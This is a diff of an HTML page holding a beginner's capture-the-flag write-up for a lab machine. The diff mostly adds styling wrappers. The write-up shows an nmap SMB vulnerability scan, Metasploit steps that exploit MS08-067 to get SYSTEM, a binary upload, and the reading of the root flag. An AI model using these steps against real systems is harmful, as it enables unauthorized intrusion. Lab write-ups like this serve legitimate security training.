@@ -6,6 +6,7 @@
         <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@300&family=Montserrat:wght@300&family=Sacramento&display=swap" rel="stylesheet">
         
         <link rel="stylesheet" type="text/css" href="../style.css">
+        <link rel="stylesheet" type="text/css" href="../style-writeup.css">
         
         <title>7s26simon</title>
         
@@ -64,7 +65,7 @@
      <h2>2. Nmap's NSE (Further enum)</h2>
      
      
-        <p>I tried testing smb first, using a guest account to see if it has a password. Next up I honed in on the ports with an nmap script: <pre><b>nmap -script smb-vuln -p 139,445 10.10.10.4)</b></pre>
+        <p>I tried testing smb first, using a guest account to see if it has a password. Next up I honed in on the ports with an nmap script: <div class="code-view"><pre><b>nmap -script smb-vuln -p 139,445 10.10.10.4)</b></pre></div>
         
         <p>Running this Nmap scan looking for issues with SMB resulted in a finding for ms08-067:</p>
         
@@ -77,29 +78,29 @@
     
     <p>I decided to go with the MS08-067 exploit and opened it up in metasploit:</p>
         
-    <pre><b>Search MS08-067
+    <div class="code-view"><pre><b>Search MS08-067
 
     Use 0
 
     Set RHOSTS 10.10.10.4
 
-    Run</b></pre>    
+    Run</b></pre></div>   
         
     <p>So now, I was running as SYSTEM but I couldn’t run various commands e.g whoami.
 So I decided to upload it from my local machine:</p>       
         
-    <pre><b>si@kali:~$ locate whoami.exe
+    <div class="code-view"><pre><b>si@kali:~$ locate whoami.exe
 
     /usr/share/windows-resources/binaries/whoami.exe</b></pre>    
     
     <p>I ran the following command:</p>
         
-        <pre><b>Upload /usr/share/windows-resources/binaries/whoami.exe</b></pre>
+        <pre><b>Upload /usr/share/windows-resources/binaries/whoami.exe</b></pre></div>
      
     <p>I could now run the command(s) I wanted. I figured I should do this to feel "complete". Next up, was reading the flag:</p>
         
 
-<pre><b>Directory of C:\Documents and Settings\Administrator\Desktop
+<div class="code-view"><pre><b>Directory of C:\Documents and Settings\Administrator\Desktop
 
 16/03/2017  09:18       DIR          .
 
@@ -118,7 +119,7 @@ more root.txt
 
 ***hash removed***
 </b>
-</pre>
+</pre></div>
 <!-- b / pre in this order is valid. pre /b not valid html -->
 
 <p>And that was that. First box, done!</p>
